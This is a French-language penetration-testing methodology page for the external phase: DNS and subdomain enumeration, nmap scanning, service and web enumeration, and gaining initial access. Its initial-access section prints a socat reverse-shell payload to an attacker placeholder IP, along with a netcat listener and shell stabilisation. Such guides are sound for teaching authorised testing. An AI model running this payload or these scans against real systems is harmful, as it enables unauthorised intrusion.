# Phase de test externe

La phase externe simule un attaquant anonyme qui tente de penetrer le perimetre de l'organisation depuis internet. Elle couvre la reconnaissance, l'enumeration des services exposes et l'exploitation des applications web pour obtenir un point d'entree dans le reseau interne.

## Pourquoi

La surface d'attaque externe est la premiere ligne de defense d'une organisation. Les services mal configures, les applications web vulnerables et les informations exposees publiquement constituent les vecteurs d'acces les plus courants pour un attaquant reel.

## Comment ca marche

### Reconnaissance et collecte d'informations

La premiere etape consiste a cartographier la surface d'attaque visible depuis internet.

#### Enumeration DNS

Le transfert de zone DNS, les requetes sur les sous-domaines et les enregistrements MX/SPF revelent la structure de l'infrastructure.

```bash
# - Tentative de transfert de zone
dig axfr domaine.tld @ns1.domaine.tld

# - Enumeration de sous-domaines
gobuster dns -d domaine.tld \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# - Records specifiques
dig MX domaine.tld
dig TXT domaine.tld
```

#### Scan de ports

Deux scans complementaires : un rapide pour orienter le travail, un complet en arriere-plan.

```bash
# - Scan rapide des 1000 ports les plus courants
nmap -sV --open -oA scan_rapide <IP_CIBLE>

# - Scan complet avec detection de version et scripts
nmap -sV -sC -p- -A -oA scan_complet <IP_CIBLE>
```

{% hint style="info" %}
Sauvegarder les scans en format XML (`-oX`) permet de les importer dans des outils comme EyeWitness pour la capture automatique de screenshots des applications web, ou dans Metasploit pour enrichir la base de donnees.
{% endhint %}

### Enumeration des services

Chaque service decouvert merite une investigation individuelle. Certains services ont des vecteurs d'attaque specifiques.

| Service | Port | Vecteurs courants |
|---|---|---|
| **FTP** | 21 | Acces anonyme, fichiers sensibles, upload non restreint |
| **SSH** | 22 | Brute force (si usernames connus), cles faibles |
| **SMTP** | 25 | Enumeration d'utilisateurs (VRFY), relais ouvert |
| **DNS** | 53 | Transfert de zone, enumeration de sous-domaines |
| **HTTP/S** | 80/443 | Vulnerabilites web (injection, upload, XSS, SSRF) |
| **POP3/IMAP** | 110/143 | Credentials par defaut, brute force |
| **SMB** | 445 | Partages anonymes, EternalBlue, enumeration |
| **RDP** | 3389 | Brute force, BlueKeep |

#### Impasses et fausses pistes

Tous les services ne menent pas a une exploitation. Il est important de reconnaitre une impasse rapidement pour ne pas perdre de temps.

```bash
# - FTP : verifier l'acces anonyme
ftp <IP_CIBLE>
# Login: anonymous / Password: (vide)

# - Si l'acces est en lecture seule sans fichiers interessants,
# - et que la version n'a pas de CVE exploitable, passer au service suivant
```

{% hint style="warning" %}
Un service sans vulnerabilite connue n'est pas inutile. Les informations de version et de configuration collectees peuvent servir plus tard (pivot, credential reuse, etc.).
{% endhint %}

### Enumeration et exploitation web

Les applications web representent generalement la plus grande surface d'attaque externe. L'enumeration doit etre methodique.

#### Workflow d'enumeration web

1. **Screenshot automatise** : utiliser EyeWitness ou Aquatone pour capturer toutes les applications en une passe
2. **Identification des technologies** : whatweb, Wappalyzer, headers HTTP
3. **Enumeration de repertoires** : GoBuster, ffuf avec des wordlists adaptees au CMS detecte
4. **Recherche de vulnerabilites** : CVE connues pour le CMS et sa version, tests manuels (injection, upload, LFI)

```bash
# - Screenshot de toutes les applications web
eyewitness -f sous_domaines.txt -d screenshots_web

# - Identification du CMS
whatweb http://<IP_CIBLE>

# - Enumeration adaptee au CMS (exemple Drupal)
droopescan scan drupal -u http://blog.domaine.tld

# - Enumeration generique
gobuster dir -u http://<IP_CIBLE> \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50
```

#### Difference entre pentest externe et audit applicatif

| Pentest externe | Audit applicatif (WASA) |
|---|---|
| Test cursif des applications web | Test exhaustif de chaque application |
| Focus sur les vulnerabilites a haut impact (RCE, SQLi, upload) | Rapport de toutes les vulnerabilites, y compris mineures |
| Objectif : obtenir un acces interne | Objectif : inventaire complet des failles |
| Findings informationnels regroupes si necessaire | Chaque finding documente individuellement |

{% hint style="success" %}
Lors d'un pentest externe, ne pas perdre de temps sur les findings mineurs (cookie sans flag Secure, version dans les headers). Les noter dans un finding informatif regroupe et se concentrer sur les vecteurs qui menent a un acces.
{% endhint %}

### Obtention d'un acces initial

L'objectif de la phase externe est d'obtenir un point d'entree dans le reseau interne. Les vecteurs les plus courants sont les suivants.

| Vecteur | Exemple |
|---|---|
| **Injection de commande** | Application web qui execute des commandes systeme sans filtrage |
| **Upload non restreint** | Depot d'un web shell via un formulaire d'upload |
| **Exploitation de CMS** | Vulnerabilite connue dans WordPress, Drupal, Joomla |
| **Credentials par defaut** | Interface d'administration avec identifiants non modifies |
| **Exploitation de service** | Vulnerabilite dans un service reseau (FTP, SMB, etc.) |

```bash
# - Obtention d'un reverse shell apres exploitation
# - Listener sur la machine d'attaque
nc -nlvp 8443

# - Payload adapte au contexte (exemple socat pour contourner un filtre)
socat TCP4:<IP_ATTAQUANT>:8443 EXEC:bash

# - Stabilisation immediate du shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Pieges et galeres

- **Trop de temps sur un seul service** : si un service resiste apres 30-45 minutes d'investigation, noter les observations et passer au suivant. Il sera toujours possible d'y revenir
- **Oublier le scan complet** : le scan rapide des 1000 ports manque regulierement des services sur des ports non standard. Toujours lancer un scan `-p-` en arriere-plan
- **Enumeration web insuffisante** : une seule wordlist ne suffit pas. Adapter les wordlists au CMS detecte (ex: wp-content pour WordPress, sites/default pour Drupal)
- **Ne pas verifier les sous-domaines** : un vhost mal securise peut etre la porte d'entree alors que le site principal est bien protege
- **Exploitation sans comprendre** : executer un exploit sans lire son code source peut avoir des effets de bord (suppression de fichiers, modification de configuration). Toujours lire le code avant d'executer

## Memo express

| Phase | Action | Outil |
|---|---|---|
| **DNS** | Sous-domaines, transfert de zone | `gobuster dns`, `dig axfr` |
| **Scan de ports** | Rapide + complet en arriere-plan | `nmap -sV`, `nmap -p- -A` |
| **Services** | Enumeration individuelle de chaque service | Netcat, scripts NSE, outils specifiques |
| **Web** | Screenshots, CMS, repertoires, vulnerabilites | EyeWitness, whatweb, GoBuster, ffuf |
| **Acces initial** | Exploitation web ou service, reverse shell | Exploit adapte + `nc -nlvp` |

***
